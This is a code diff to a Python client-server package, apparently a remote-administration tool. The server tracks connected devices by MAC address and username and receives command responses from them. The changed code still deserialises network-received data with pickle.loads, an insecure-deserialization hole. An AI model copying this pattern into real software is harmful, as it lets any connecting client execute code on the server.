@@ -9,7 +9,6 @@ from .rentry import Rentry
 from .enums import NetterClient, PacketType, ClientResponse
 from .handler import ClientHandler
 from .logger import Logging
-from .back_end import backEnd_server
 from .bucket import ConnectionBucket
 
 
@@ -26,24 +25,14 @@ class ClientWrapper:
         if isinstance(data, str):
             data = data.encode("utf-8")
 
-        def run() -> None:
-            if packetType == PacketType.COMMAND_RESPONSE:
-                _sleep(0.1)
+        packet_length: int = len(data).to_bytes(4, "big")
+        packet_type: int = packetType.value.to_bytes(2, "little")
 
-            packet_length: int = len(data).to_bytes(4, "big")
-            packet_type: int = packetType.value.to_bytes(2, "little")
+        self.socket.send(packet_length)
+        self.socket.send(packet_type)
 
-            self.socket.send(packet_length)
-            self.socket.send(packet_type)
-
-            for chunk in range(0, len(data), self.BYTES_CHUNK):
-                self.socket.sendall(data[chunk : chunk + self.BYTES_CHUNK])
-
-        if packetType == PacketType.COMMAND_RESPONSE:
-            threading.Thread(target=run).start()
-            return
-
-        run()
+        for chunk in range(0, len(data), self.BYTES_CHUNK):
+            self.socket.sendall(data[chunk : chunk + self.BYTES_CHUNK])
 
     def receive(self) -> ClientResponse:
         try:
@@ -71,7 +60,6 @@ class ClientWrapper:
 
         if packet_type in _consoles and self.netServer:
             self.netServer.console_log(data.decode("utf-8"), level=PacketType._value2member_map_[packet_type].name[8:])
-
             return len(data)
 
         return ClientResponse(PacketType._value2member_map_.get(packet_type, PacketType.UNKNOWN), bytes(data))
@@ -155,12 +143,14 @@ class NetterServer(Logging, ConnectionBucket):
             self.console_log(
                 "Server is listening on %s:%s" % self.bindAddress,
             )
-            backEnd_server(self).start()  # Starting server-side
 
             while self.alive is True:
                 clientSocket: ClientWrapper = ClientWrapper(self.socket.accept()[0], self)
 
-                if _deviceInformation := pickle.loads(clientSocket.receive().data):
+                if not (data := clientSocket.receive()).packetType == PacketType.DEVICE_INFORMATION:
+                    break
+
+                if _deviceInformation := pickle.loads(data.data):
                     device: NetterClient = NetterClient(
                         clientSocket,
                         hashlib.sha256(str(_deviceInformation["MAC_Address"] + _deviceInformation["Username"]).encode("UTF-8")).hexdigest(),
